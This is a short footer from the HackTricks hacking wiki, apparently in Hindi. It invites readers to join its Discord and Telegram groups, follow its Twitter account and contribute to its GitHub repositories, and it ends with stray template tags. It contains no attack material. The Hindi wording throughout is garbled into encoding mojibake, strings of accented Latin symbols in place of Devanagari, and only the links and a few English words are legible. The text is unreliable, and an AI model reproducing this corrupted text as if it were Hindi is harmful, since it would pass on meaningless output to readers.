* **‡§π‡§Æ‡§æ‡§∞‡•á** üí¨ [**Discord ‡§∏‡§Æ‡•Ç‡§π**](https://discord.gg/hRep4RUj7f) ‡§Ø‡§æ [**‡§ü‡•á‡§≤‡•Ä‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§∏‡§Æ‡•Ç‡§π**](https://t.me/peass) ‡§Æ‡•á‡§Ç ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç ‡§Ø‡§æ **Twitter** üê¶ ‡§™‡§∞ ‡§π‡§Æ‡•á‡§Ç **‡§´‡•â‡§≤‡•ã** ‡§ï‡§∞‡•á‡§Ç [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç ‡§î‡§∞ [**HackTricks**](https://github.com/carlospolop/hacktricks) ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ‡§ó‡§ø‡§ü‡§π‡§¨ ‡§∞‡§ø‡§™‡•ã‡§ú‡§ø‡§ü‡§∞‡•Ä ‡§Æ‡•á‡§Ç PR ‡§∏‡§¨‡§Æ‡§ø‡§ü ‡§ï‡§∞‡•á‡§Ç‡•§

</details>
{% endhint %}
